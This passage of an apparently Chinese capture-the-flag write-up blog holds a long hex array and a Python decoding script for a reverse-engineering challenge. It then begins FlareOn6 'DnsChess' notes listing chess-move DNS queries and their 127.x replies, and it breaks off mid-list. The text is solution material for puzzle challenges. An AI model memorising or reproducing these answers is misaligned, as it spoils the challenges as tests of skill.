class="number">0x38</span>, <span class="number">0x4a</span>, <span class="number">0x10</span>, <span class="number">0x57</span>, <span class="number">0x2a</span>, <span class="number">0x0</span>, <span class="number">0x23</span>, <span class="number">0x54</span>, <span class="number">0x56</span>, <span class="number">0x14</span>, <span class="number">0x0</span>, <span class="number">0x54</span>, <span class="number">0x55</span>, <span class="number">0x2e</span>, <span class="number">0x22</span>, <span class="number">0x54</span>, <span class="number">0x54</span>, <span class="number">0x10</span>, <span class="number">0x24</span>, <span class="number">0x54</span>, <span class="number">0x0</span>, <span class="number">0x32</span>, <span class="number">0x11</span>, <span class="number">0x57</span>, <span class="number">0x3b</span>, <span class="number">0xc</span>, <span class="number">0x27</span>, <span class="number">0x2d</span>, <span class="number">0x26</span>, <span class="number">0x5c</span>, <span class="number">0x5c</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x54</span>, <span class="number">0x38</span>, <span class="number">0x0</span>, <span class="number">0x2f</span>, <span class="number">0x57</span>, <span class="number">0x0</span>, <span class="number">0x2e</span>, <span class="number">0x4</span>, <span class="number">0x57</span>, <span class="number">0x2a</span>, <span class="number">0x26</span>, <span class="number">0x2c</span>, <span class="number">0x28</span>, <span class="number">0x36</span>, <span class="number">0x5c</span>, <span class="number">0x5c</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x54</span>, <span class="number">0xe</span>, <span class="number">0x8</span>, <span class="number">0x33</span>, <span class="number">0x54</span>, <span class="number">0x38</span>, <span class="number">0x14</span>, <span class="number">0x29</span>, <span class="number">0x54</span>, <span class="number">0x11</span>, <span class="number">0x36</span>, <span class="number">0x8</span>, <span class="number">0x54</span>, <span class="number">0x3b</span>, <span class="number">0x18</span>, <span class="number">0x16</span>, <span class="number">0x54</span>, <span class="number">0xe</span>, <span class="number">0x10</span>, <span class="number">0x12</span>, <span class="number">0x57</span>, <span class="number">0x2d</span>, <span class="number">0x36</span>, <span class="number">0x52</span>, <span class="number">0x54</span>, <span class="number">0x0</span>, <span class="number">0x32</span>, <span class="number">0x51</span>, <span class="number">0x2d</span>, <span class="number">0x2c</span>, <span class="number">0x5c</span>, <span class="number">0x5c</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x54</span>, <span class="number">0x54</span>, <span class="number">0x18</span>, <span class="number">0x2d</span>, <span class="number">0x54</span>, <span class="number">0x54</span>, <span class="number">0x53</span>, <span class="number">0x20</span>, <span class="number">0x57</span>, <span class="number">0x28</span>, <span class="number">0x18</span>, <span class="number">0x13</span>, <span class="number">0x57</span>, <span class="number">0x28</span>, <span class="number">0x18</span>, <span class="number">0x13</span>, <span class="number">0x54</span>, <span class="number">0x54</span>, <span class="number">0x10</span>, <span class="number">0x24</span>, <span class="number">0x54</span>, <span class="number">0x0</span>, <span class="number">0x57</span>, <span class="number">0x29</span>, <span class="number">0x54</span>, <span class="number">0x0</span>, <span class="number">0x57</span>, <span class="number">0x3b</span>, <span class="number">0x2d</span>, <span class="number">0x29</span>, <span class="number">0x5c</span>, <span class="number">0x5c</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x54</span>, <span class="number">0x0</span>, <span class="number">0x32</span>, <span class="number">0x0</span>, <span class="number">0x54</span>, <span class="number">0x3</span>, <span class="number">0x22</span>, <span class="number">0x33</span>, <span class="number">0x54</span>, <span class="number">0x11</span>, <span class="number">0x18</span>, <span class="number">0x10</span>, <span class="number">0x54</span>, <span class="number">0x54</span>, <span class="number">0x4a</span>, <span class="number">0xd</span>, <span class="number">0x54</span>, <span class="number">0x54</span>, <span class="number">0x10</span>, <span class="number">0x24</span>, <span class="number">0x54</span>, <span class="number">0x11</span>, <span class="number">0x8</span>, <span class="number">0x7</span>, <span class="number">0x54</span>, <span class="number">0x54</span>, <span class="number">0x22</span>, <span class="number">0x25</span>, <span class="number">0x2d</span>, <span class="number">0x2b</span>, <span class="number">0x5c</span>, <span class="number">0x5c</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x54</span>, <span class="number">0x11</span>, <span class="number">0x18</span>, <span class="number">0x2b</span>, <span class="number">0x54</span>, <span class="number">0x13</span>, <span class="number">0x2a</span>, <span class="number">0x9</span>, <span class="number">0x54</span>, <span class="number">0x11</span>, <span class="number">0x18</span>, <span class="number">0x2b</span>, <span class="number">0x57</span>, <span class="number">0x38</span>, <span class="number">0x22</span>, <span class="number">0x0</span>, <span class="number">0x54</span>, <span class="number">0x3b</span>, <span class="number">0x22</span>, <span class="number">0x33</span>, <span class="number">0x54</span>, <span class="number">0x11</span>, <span class="number">0x18</span>, <span class="number">0x10</span>, <span class="number">0x54</span>, <span class="number">0x11</span>, <span class="number">0x53</span>, <span class="number">0xd</span>, <span class="number">0x57</span>, <span class="number">0x2d</span>, <span class="number">0x4</span>, <span class="number">0x17</span>, <span class="number">0x54</span>, <span class="number">0x38</span>, <span class="number">0x4a</span>, <span class="number">0xb</span>, <span class="number">0x2d</span>, <span class="number">0x25</span>, <span class="number">0x5c</span>, <span class="number">0x5c</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x54</span>, <span class="number">0x2d</span>, <span class="number">0x10</span>, <span class="number">0x18</span>, <span class="number">0x54</span>, <span class="number">0x55</span>, <span class="number">0x8</span>, <span class="number">0x19</span>, <span class="number">0x54</span>, <span class="number">0x54</span>, <span class="number">0x10</span>, <span class="number">0x24</span>, <span class="number">0x54</span>, <span class="number">0x2d</span>, <span class="number">0x18</span>, <span class="number">0x3b</span>, <span class="number">0x54</span>, <span class="number">0x2d</span>, <span class="number">0x18</span>, <span class="number">0x51</span>, <span class="number">0x2d</span>, <span class="number">0x23</span>, <span class="number">0x5c</span>, <span class="number">0x5c</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x57</span>, <span class="number">0x2a</span>, <span class="number">0x57</span>, <span class="number">0x11</span>, <span class="number">0x54</span>, <span class="number">0xe</span>, <span class="number">0x8</span>, <span class="number">0x33</span>, <span class="number">0x54</span>, <span class="number">0x2d</span>, <span class="number">0x14</span>, <span class="number">0x12</span>, <span class="number">0x54</span>, <span class="number">0x2d</span>, <span class="number">0x8</span>, <span class="number">0x20</span>, <span class="number">0x57</span>, <span class="number">0x2d</span>, <span class="number">0x36</span>, <span class="number">0x52</span>, <span class="number">0x54</span>, <span class="number">0x55</span>, <span class="number">0x2a</span>, <span class="number">0x54</span>, <span class="number">0x54</span>, <span class="number">0x55</span>, <span class="number">0x4</span>, <span class="number">0x25</span>, <span class="number">0x2d</span>, <span class="number">0x26</span>, <span class="number">0x5c</span>, <span class="number">0x5c</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x54</span>, <span class="number">0x38</span>, <span class="number">0x14</span>, <span class="number">0x29</span>, <span class="number">0x54</span>, <span class="number">0x13</span>, <span class="number">0x22</span>, <span class="number">0x34</span>, <span class="number">0x54</span>, <span class="number">0x3b</span>, <span class="number">0x2a</span>, <span class="number">0x2c</span>, <span class="number">0x54</span>, <span class="number">0x2d</span>, <span class="number">0x4a</span>, <span class="number">0x9</span>, <span class="number">0x54</span>, <span class="number">0x3</span>, <span class="number">0x4a</span>, <span class="number">0x50</span>, <span class="number">0x2d</span>, <span class="number">0x2e</span>, <span class="number">0x5c</span>, <span class="number">0x5c</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x54</span>, <span class="number">0x3b</span>, <span class="number">0x18</span>, <span class="number">0xe</span>, <span class="number">0x57</span>, <span class="number">0x38</span>, <span class="number">0x26</span>, <span class="number">0xd</span>, <span class="number">0x57</span>, <span class="number">0x2d</span>, <span class="number">0x4a</span>, <span class="number">0x2</span>, <span class="number">0x54</span>, <span class="number">0x54</span>, <span class="number">0x10</span>, <span class="number">0x24</span>, <span class="number">0x54</span>, <span class="number">0x0</span>, <span class="number">0x32</span>, <span class="number">0x11</span>, <span class="number">0x57</span>, <span class="number">0x2d</span>, <span class="number">0x57</span>, <span class="number">0x54</span>, <span class="number">0x2d</span>, <span class="number">0x26</span>, <span class="number">0x5c</span>, <span class="number">0x5c</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x57</span>, <span class="number">0x3b</span>, <span class="number">0x2e</span>, <span class="number">0x53</span>, <span class="number">0x54</span>, <span class="number">0x13</span>, <span class="number">0x2a</span>, <span class="number">0x1b</span>, <span class="number">0x57</span>, <span class="number">0x2d</span>, <span class="number">0x57</span>, <span class="number">0x54</span>, <span class="number">0x54</span>, <span class="number">0x56</span>, <span class="number">0x18</span>, <span class="number">0x38</span>, <span class="number">0x2d</span>, <span class="number">0x29</span>, <span class="number">0x5c</span>, <span class="number">0x5c</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x54</span>, <span class="number">0x11</span>, <span class="number">0x18</span>, <span class="number">0x2b</span>, <span class="number">0x54</span>, <span class="number">0x2d</span>, <span class="number">0x8</span>, <span class="number">0x20</span>, <span class="number">0x54</span>, <span class="number">0x55</span>, <span class="number">0xc</span>, <span class="number">0x29</span>, <span class="number">0x54</span>, <span class="number">0x57</span>, <span class="number">0x36</span>, <span class="number">0x4</span>, <span class="number">0x54</span>, <span class="number">0x0</span>, <span class="number">0x36</span>, <span class="number">0x29</span>, <span class="number">0x54</span>, <span class="number">0x54</span>, <span class="number">0x10</span>, <span class="number">0x24</span>, <span class="number">0x54</span>, <span class="number">0x3</span>, <span class="number">0x53</span>, <span class="number">0x11</span>, <span class="number">0x57</span>, <span class="number">0x2b</span>, <span class="number">0xc</span>, <span class="number">0x54</span>, <span class="number">0x54</span>, <span class="number">0x13</span>, <span class="number">0x36</span>, <span class="number">0x52</span>, <span class="number">0x2d</span>, <span class="number">0x22</span>, <span class="number">0x5c</span>, <span class="number">0x5c</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x54</span>, <span class="number">0x3b</span>, <span class="number">0x2a</span>, <span class="number">0x2c</span>, <span class="number">0x54</span>, <span class="number">0xe</span>, <span class="number">0x8</span>, <span class="number">0x33</span>, <span class="number">0x54</span>, <span class="number">0x2d</span>, <span class="number">0x8</span>, <span class="number">0x20</span>, <span class="number">0x57</span>, <span class="number">0x2d</span>, <span class="number">0x36</span>, <span class="number">0x52</span>, <span class="number">0x54</span>, <span class="number">0x38</span>, <span class="number">0x0</span>, <span class="number">0x32</span>, <span class="number">0x57</span>, <span class="number">0x3b</span>, <span class="number">0xc</span>, <span class="number">0x11</span>, <span class="number">0x2d</span>, <span class="number">0x23</span>, <span class="number">0x5c</span>, <span class="number">0x5c</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x57</span>, <span class="number">0x0</span>, <span class="number">0x2e</span>, <span class="number">0x4</span>, <span class="number">0x54</span>, <span class="number">0x3b</span>, <span class="number">0x22</span>, <span class="number">0x33</span>, <span class="number">0x54</span>, <span class="number">0x38</span>, <span class="number">0x4a</span>, <span class="number">0xc</span>, <span class="number">0x54</span>, <span class="number">0x2d</span>, <span class="number">0x8</span>, <span class="number">0x20</span>, <span class="number">0x54</span>, <span class="number">0x2d</span>, <span class="number">0x8</span>, <span class="number">0x10</span>, <span class="number">0x54</span>, <span class="number">0x2d</span>, <span class="number">0x8</span>, <span class="number">0x36</span>, <span class="number">0x54</span>, <span class="number">0x54</span>, <span class="number">0x36</span>, <span class="number">0x2c</span>, <span class="number">0x2d</span>, <span class="number">0x22</span>, <span class="number">0x5c</span>, <span class="number">0x5c</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x54</span>, <span class="number">0x3b</span>, <span class="number">0x18</span>, <span class="number">0xe</span>, <span class="number">0x57</span>, <span class="number">0x38</span>, <span class="number">0x26</span>, <span class="number">0xd</span>, <span class="number">0x57</span>, <span class="number">0x2d</span>, <span class="number">0x4a</span>, <span class="number">0x2</span>, <span class="number">0x54</span>, <span class="number">0x54</span>, <span class="number">0x10</span>, <span class="number">0x24</span>, <span class="number">0x54</span>, <span class="number">0x0</span>, <span class="number">0x32</span>, <span class="number">0x11</span>, <span class="number">0x57</span>, <span class="number">0x2d</span>, <span class="number">0x57</span>, <span class="number">0x54</span>, <span class="number">0x2d</span>, <span class="number">0x23</span>, <span class="number">0x5c</span>, <span class="number">0x5c</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x57</span>, <span class="number">0x3b</span>, <span class="number">0x2e</span>, <span class="number">0x53</span>, <span class="number">0x54</span>, <span class="number">0x13</span>, <span class="number">0x2a</span>, <span class="number">0x1b</span>, <span class="number">0x57</span>, <span class="number">0x2d</span>, <span class="number">0x57</span>, <span class="number">0x54</span>, <span class="number">0x54</span>, <span class="number">0x56</span>, <span class="number">0x18</span>, <span class="number">0x38</span>, <span class="number">0x2d</span>, <span class="number">0x22</span>, <span class="number">0x5c</span>, <span class="number">0x5c</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x54</span>, <span class="number">0x11</span>, <span class="number">0x18</span>, <span class="number">0x2b</span>, <span class="number">0x54</span>, <span class="number">0x2d</span>, <span class="number">0x8</span>, <span class="number">0x20</span>, <span class="number">0x54</span>, <span class="number">0x55</span>, <span class="number">0xc</span>, <span class="number">0x29</span>, <span class="number">0x54</span>, <span class="number">0x57</span>, <span class="number">0x36</span>, <span class="number">0x4</span>, <span class="number">0x54</span>, <span class="number">0x0</span>, <span class="number">0x36</span>, <span class="number">0x29</span>, <span class="number">0x54</span>, <span class="number">0x54</span>, <span class="number">0x10</span>, <span class="number">0x24</span>, <span class="number">0x54</span>, <span class="number">0x3</span>, <span class="number">0x53</span>, <span class="number">0x11</span>, <span class="number">0x57</span>, <span class="number">0x2b</span>, <span class="number">0xc</span>, <span class="number">0x54</span>, <span class="number">0x54</span>, <span class="number">0x13</span>, <span class="number">0x36</span>, <span class="number">0x52</span>, <span class="number">0x2d</span>, <span class="number">0x23</span>, <span class="number">0x5c</span>, <span class="number">0x5c</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x54</span>, <span class="number">0x3b</span>, <span class="number">0x2a</span>, <span class="number">0x2c</span>, <span class="number">0x54</span>, <span class="number">0xe</span>, <span class="number">0x8</span>, <span class="number">0x33</span>, <span class="number">0x54</span>, <span class="number">0x2d</span>, <span class="number">0x8</span>, <span class="number">0x20</span>, <span class="number">0x57</span>, <span class="number">0x2d</span>, <span class="number">0x36</span>, <span class="number">0x52</span>, <span class="number">0x54</span>, <span class="number">0x38</span>, <span class="number">0x0</span>, <span class="number">0x32</span>, <span class="number">0x57</span>, <span class="number">0x3b</span>, <span class="number">0xc</span>, <span class="number">0x11</span>, <span class="number">0x2d</span>, <span class="number">0x29</span>, <span class="number">0x5c</span>, <span class="number">0x5c</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x57</span>, <span class="number">0x0</span>, <span class="number">0x2e</span>, <span class="number">0x4</span>, <span class="number">0x54</span>, <span class="number">0x3b</span>, <span class="number">0x22</span>, <span class="number">0x33</span>, <span class="number">0x54</span>, <span class="number">0x38</span>, <span class="number">0x4a</span>, <span class="number">0xc</span>, <span class="number">0x54</span>, <span class="number">0x2d</span>, <span class="number">0x8</span>, <span class="number">0x20</span>, <span class="number">0x54</span>, <span class="number">0x2d</span>, <span class="number">0x8</span>, <span class="number">0x10</span>, <span class="number">0x54</span>, <span class="number">0x2d</span>, <span class="number">0x8</span>, <span class="number">0x36</span>, <span class="number">0x54</span>, <span class="number">0x54</span>, <span class="number">0x36</span>, <span class="number">0x2c</span>, <span class="number">0x2d</span>, <span class="number">0x2f</span>, <span class="number">0x5c</span>, <span class="number">0x5c</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x2</span>, <span class="number">0x52</span>, <span class="number">0x37</span>, <span class="number">0x16</span>, <span class="number">0x3b</span>, <span class="number">0x39</span>, <span class="number">0x28</span>, <span class="number">0x6</span>, <span class="number">0x3</span>, <span class="number">0x36</span>, <span class="number">0x27</span>, <span class="number">0xf</span>, <span class="number">0x0</span>, <span class="number">0x36</span>, <span class="number">0x2c</span>, <span class="number">0x6</span>, <span class="number">0x5</span>, <span class="number">0x53</span>, <span class="number">0x58</span>, <span class="number">0x18</span>, <span class="number">0x3</span>, <span class="number">0x26</span>, <span class="number">0x33</span>, <span class="number">0x4a</span>, <span class="number">0x7</span>, <span class="number">0x6</span>, <span class="number">0x5c</span>, <span class="number">0x5c</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>, <span class="number">0x0</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">trans</span>(<span class="params">v3</span>):</span></span><br><span class="line">    v2 = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> range(<span class="number">8</span>):</span><br><span class="line">        v2 = andd(((v3&gt;&gt;(<span class="number">7</span>-k))&amp;<span class="number">1</span>),((<span class="number">97</span>&gt;&gt;(<span class="number">7</span>-k))&amp;<span class="number">1</span>))&amp;<span class="number">1</span>^<span class="number">2</span>*v2</span><br><span class="line">        v2&amp;=<span class="number">0xff</span></span><br><span class="line">    <span class="keyword">return</span> v2</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get</span>(<span class="params">s1,s2</span>):</span></span><br><span class="line">    b1 = <span class="number">0</span></span><br><span class="line">    b2 = <span class="number">0</span></span><br><span class="line">    i=<span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> s1[i]!=ord(<span class="string">&#x27;=&#x27;</span>):</span><br><span class="line">        b1=s1[i]</span><br><span class="line">        i+=<span class="number">1</span></span><br><span class="line">    b2 = s2[i<span class="number">-1</span>]</span><br><span class="line">    print(b1,b2)</span><br><span class="line">    <span class="keyword">return</span> b1-b2</span><br><span class="line">s = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">34</span>,<span class="number">2</span>):</span><br><span class="line">    t = <span class="number">0</span></span><br><span class="line">    ss = []</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">42</span>):</span><br><span class="line">        v3 = a[<span class="number">42</span>*i+j]</span><br><span class="line">        v2 = trans(v3)</span><br><span class="line">        ss.append(v2)</span><br><span class="line">    t=get(bytes(ss),base64.b64encode(base64.b64decode(bytes(ss))))</span><br><span class="line">    ss = []</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">42</span>):</span><br><span class="line">        v3 = a[<span class="number">42</span>*(i+<span class="number">1</span>)+j]</span><br><span class="line">        v2 = trans(v3)</span><br><span class="line">        ss.append(v2)</span><br><span class="line">    t=(t&lt;&lt;<span class="number">4</span>)+get(bytes(ss),base64.b64encode(base64.b64decode(bytes(ss))))</span><br><span class="line">    s.append(t)</span><br><span class="line">print(bytes(s))</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="rev-FlareOn6-DnsChess"><a href="#rev-FlareOn6-DnsChess" class="headerlink" title="[rev][FlareOn6]DnsChess"></a>[rev][FlareOn6]DnsChess</h2><p>国际象棋</p>
<p>使用域名查询，域名由：棋子类型-起始点-终止点.固定域名组成，返回IP为：127..顺序.验证</p>
<p>会验证顺序是否相等</p>
<p>解密也在getNextMove中，就是off_4120字符串，如果你获胜，就会把这个字符串拷贝到a3中显示</p>
<p>1.txt 为处理后的域名 ip组合</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line">rook-c3-c6.game-of-thrones.flare-on.com</span><br><span class="line">rook-c3-c6.game-of-thrones.flare-on.com 127.150.96.223 ns1.game-of-thrones.flare-on.com</span><br><span class="line">knight-g1-f3.game-of-thrones.flare-on.com</span><br><span class="line">knight-g1-f3.game-of-thrones.flare-on.com 127.252.212.90 ns1.game-of-thrones.flare-on.com</span><br><span class="line">pawn-c2-c4.game-of-thrones.flare-on.com</span><br><span class="line">pawn-c2-c4.game-of-thrones.flare-on.com 127.215.177.38 ns1.game-of-thrones.flare-on.com</span><br><span class="line">knight-c7-d5.game-of-thrones.flare-on.com</span><br><span class="line">knight-c7-d5.game-of-thrones.flare-on.com 127.118.118.207 ns1.game-of-thrones.flare-on.com</span><br><span class="line">bishop-f1-e2.game-of-thrones.flare-on.com</span><br><span class="line">bishop-f1-e2.game-of-thrones.flare-on.com 127.89.38.84 ns1.game-of-thrones.flare-on.com</span><br><span class="line">rook-a1-g1.game-of-thrones.flare-on.com</span><br><span class="line">rook-a1-g1.game-of-thrones.flare-on.com 127.109.155.97 ns1.game-of-thrones.flare-on.com</span><br><span class="line">bishop-c1-f4.game-of-thrones.flare-on.com</span><br><span class="line">bishop-c1-f4.game-of-thrones.flare-on.com 127.217.37.102 ns1.game-of-thrones.flare-on.com</span><br><span class="line">bishop-c6-a8.game-of-thrones.flare-on.com</span><br><span class="line">bishop-c6-a8.game-of-thrones.flare-on.com 127.49.59.14 ns1.game-of-thrones.flare-on.com</span><br><span class="line">pawn-e2-e4.game-of-thrones.flare-on.com</span><br><span class="line">pawn-e2-e4.game-of-thrones.flare-on.com 127.182.147.24 ns1.game-of-thrones.flare-on.com</span><br><span class="line">king-g1-h1.game-of-thrones.flare-on.com</span><br><span class="line">king-g1-h1.game-of-thrones.flare-on.com 127.0.143.11 ns1.game-of-thrones.flare-on.com</span><br><span class="line">knight-g1-h3.game-of-thrones.flare-on.com</span><br><span class="line">knight-g1-h3.game-of-thrones.flare-on.com 127.227.42.139 ns1.game-of-thrones.flare-on.com</span><br><span class="line">king-e5-f5.game-of-thrones.flare-on.com</span><br><span class="line">king-e5-f5.game-of-thrones.flare-on.com 127.101.64.243 ns1.game-of-thrones.flare-on.com</span><br><span class="line">queen-d1-f3.game-of-thrones.flare-on.com</span><br><span class="line">queen-d1-f3.game-of-thrones.flare-on.com 127.201.85.103 ns1.game-of-thrones.flare-on.com</span><br><span class="line">pawn-e5-e6.game-of-thrones.flare-on.com</span><br><span class="line">pawn-e5-e6.game-of-thrones.flare-on.com 127.200.76.108 ns1.game-of-thrones.flare-on.com</span><br><span class="line">king-c4-b3.game-of-thrones.flare-on.com</span><br><span class="line">king-c4-b3.game-of-thrones.flare-on.com 127.50.67.23 ns1.game-of-thrones.flare-on.com</span><br><span class="line">king-c1-b1.game-of-thrones.flare-on.com</span><br><span class="line">king-c1-b1.game-of-thrones.flare-on.com 127.157.96.119 ns1.game-of-thrones.flare-on.com</span><br><span class="line">queen-d1-h5.game-of-thrones.flare-on.com</span><br><span class="line">queen-d1-h5.game-of-thrones.flare-on.com 127.99.253.122 ns1.game-of-thrones.flare-on.com</span><br><span class="line">bishop-f3-c6.game-of-thrones.flare-on.com</span><br><span class="line">bishop-f3-c6.game-of-thrones.flare-on.com 127.25.74.92 ns1.game-of-thrones.flare-on.com</span><br><span 